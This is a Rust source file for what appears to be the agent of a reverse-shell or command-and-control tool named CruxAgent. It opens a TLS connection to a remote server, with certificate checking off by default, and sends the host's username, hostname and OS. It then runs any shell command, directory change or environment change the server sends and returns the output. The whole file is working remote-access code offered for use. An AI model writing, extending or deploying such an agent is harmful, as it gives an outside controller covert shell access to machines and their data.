mod args;
#[path = "../utils/mod.rs"]
mod utils;

// crates
use native_tls::{TlsConnector, TlsStream};
use clap::error::Result;
use clap::{Parser};
use whoami::{self, fallible};
use serde_json;
use subprocess::{Exec, ExitStatus, Redirection};

// std
use std::env;
use std::net::{TcpStream};

// My stuff
use args::CruxAgentArgs;
use utils::os::{Metadata, os_detect};
use utils::network::write_length_prefix;
use utils::data::{CmdType, Cmd, CmdResult};
use utils::network::read_length_prefix;
use utils::shell_var::parse_var_def;

fn send_metadata(stream :&mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
    // Prepare Metadata
    let metadata = Metadata {
        username: whoami::username(),
        hostname: fallible::hostname().map_or("UNKNOWN_HOSTNAME".to_string(),|d| d),
        os_type: os_detect()
    };
    let metadata_serial = serde_json::to_string(&metadata)?;

    // Send metadata back to CruxServer
    let _ = write_length_prefix(stream, &metadata_serial.as_bytes());
    Ok(())
}

fn send_response(cmd_result: &CmdResult, stream: &mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
    // Serialize CmdResult
    let result_str = serde_json::to_string(cmd_result)?;
    write_length_prefix(stream, result_str.as_bytes())?;
    Ok(())
}

fn normalize_exit_code(status: ExitStatus) -> i64 {
    match status {
        ExitStatus::Exited(code) => code.into(),
        ExitStatus::Signaled(sig) => <u8 as Into<i64>>::into(sig)*-1,
        ExitStatus::Other(code) => code.into(),
        ExitStatus::Undetermined => -1,
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = CruxAgentArgs::parse();

    // Connect to CruxServer via TLS
    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(!args.verify_cert)
        .build().unwrap();

    let ip_str = format!("{}:{}", args.rhost, args.rport);
    let stream = TcpStream::connect(ip_str)?;
    let mut stream = connector.connect(&args.rhost.to_string(), stream)?;

    send_metadata(&mut stream)?;

    // Set User environment variable
    let user = whoami::username();
    unsafe {
        env::set_var("USER", &user);
    }

    loop {
        let received_cmd_vec = match read_length_prefix(&mut stream){
            Ok(c) => c,
            Err(_) => continue
        };
        let received_cmd: Cmd = match serde_json::from_slice(&received_cmd_vec) {
            Ok(c) => c,
            Err(_) => continue
        };

        let mut cmd_result = CmdResult::default();
        match received_cmd.cmd_type {
            CmdType::Exit =>{
                break
            }
            CmdType::Cd =>{
                let new_dir = match received_cmd.args.as_str() {
                    "" => env::var("HOME").unwrap_or("/".to_string()), // Home directory
                    _ => received_cmd.args
                };
                match env::set_current_dir(new_dir) {
                    Ok(_) => {
                        cmd_result.status = 0;
                    }
                    Err(e) => {
                        cmd_result.output = e.to_string();
                    }
                };
            }
            CmdType::Export =>{
                match parse_var_def(&received_cmd.args) {
                    Ok(var_tuple) => {
                        unsafe {
                            env::set_var(var_tuple.0, var_tuple.1);
                        }
                        cmd_result.status = 0;
                    }
                    Err(e) => {
                        cmd_result.output = e.to_string();
                    }
                };
            }
            CmdType::Exec => {
                let execution = Exec::shell(&received_cmd.args)
                    .stdout(Redirection::Pipe)
                    .stderr(Redirection::Merge);

                match execution.capture(){
                    Ok(output) => {
                    cmd_result = CmdResult {
                            status: normalize_exit_code(output.exit_status),
                            output: output.stdout_str()
                        };
                    }
                    Err(_) => {
                        cmd_result.output = "Failed to run command".to_string();
                    }
                }
            }
            _ => {}
        }
        if let Err(_) = send_response(&mut cmd_result, &mut stream){
            // TODO: Introduce some error handling here???
            break;
        }
    }
    stream.shutdown()?;
    Ok(())
}
